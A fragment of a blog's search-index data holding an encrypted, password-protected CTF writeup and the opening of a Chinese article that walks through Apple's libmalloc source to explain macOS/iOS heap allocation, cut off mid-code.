writeup分析","date":"2019-04-02T06:02:40.000Z","path":"2019/04/02/applepie/applepie/","text":"Need password to decrypt! Incorrect Password! No content to display! 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","tags":[]},{"title":"源码解读macOS/iOS Heap","date":"2019-04-01T07:30:31.000Z","path":"2019/04/01/深入理解macos-heap/深入理解macos-heap/","text":"源码解读macOS/iOS Heap 关于linux的堆管理已经有很多人写了很多相关的分析，但在mac平台的堆相关的资料却很少。本文由tctf的一道mac平台pwn题目引起，是我对macOS/iOS的堆管理的一些理解，希望有所帮助。 从malloc说起malloc是我们经常使用的函数，这里也是libmalloc.dylib暴露出来的接口，另外苹果开源了libmalloc代码。所以接下来我们就从源码的角度深入下去。 void * malloc(size_t size) { void *retval; retval = malloc_zone_malloc(default_zone, size); if (retval == NULL) { errno = ENOMEM; } return retval; } 这里实际调用了malloc_zone_malloc函数，传入了default_zone全局变量 static virtual_default_zone_t virtual_default_zone __attribute__((section(&quot;__DATA,__v_zone&quot;))) __attribute__((aligned(PAGE_MAX_SIZE))) = { NULL, NULL, default_zone_size, default_zone_malloc, default_zone_calloc, default_zone_valloc, default_zone_free, default_zone_realloc, default_zone_destroy, DEFAULT_MALLOC_ZONE_STRING, default_zone_batch_malloc, default_zone_batch_free, &amp;default_zone_introspect, 10, default_zone_memalign, default_zone_free_definite_size, default_zone_pressure_relief, default_zone_malloc_claimed_address, }; static malloc_zone_t *default_zone = &amp;virtual_default_zone.malloc_zone; 这里初始化了一个默认的zone，正如名字一样virtual_default_zone其实是一个虚假的zone，接下来是调用malloc_zone_malloc void * malloc_zone_malloc(malloc_zone_t *zone, size_t size) { MALLOC_TRACE(TRACE_malloc | DBG_FUNC_START, (uintptr_t)zone, size, 0, 0); void *ptr; if (malloc_check_start &amp;&amp; (malloc_check_counter++ &gt;= malloc_check_start)) { internal_check(); } if (size &gt; MALLOC_ABSOLUTE_MAX_SIZE) { return NULL; } ptr = zone-&gt;malloc(zone, size); // if lite zone is passed in then we still call the lite methods if (malloc_logger) { malloc_logger(MALLOC_LOG_TYPE_ALLOCATE | MALLOC_LOG_TYPE_HAS_ZONE, (uintptr_t)zone, (uintptr_t)size, 0, (uintptr_t)ptr, 0); } MALLOC_TRACE(TRACE_malloc | DBG_FUNC_END, (uintptr_t)zone, size, (uintptr_t)ptr, 0); return ptr; } 这里调用的ptr = zone-&gt;malloc(zone, size);就是default_zone_malloc函数 static void * default_zone_malloc(malloc_zone_t *zone, size_t size) { zone = runtime_default_zone(); return zone-&gt;malloc(zone, size); } 这里的runtime_default_zone()很重要，其实这里才是去真正的初始化zone runtime_default_zone // inline ----inline_malloc_default_zone //inline --------_malloc_initialize_once //inline ------------_malloc_initialize() 下面看_malloc_initialize函数，去掉了一些不相干代码 static void _malloc_initialize(void *context __unused) { MALLOC_LOCK(); unsigned n; malloc_zone_t *zone = NULL; ... zone = create_scalable_zone(0, malloc_debug_flags); malloc_zone_register_while_locked(zone); malloc_set_zone_name(zone, 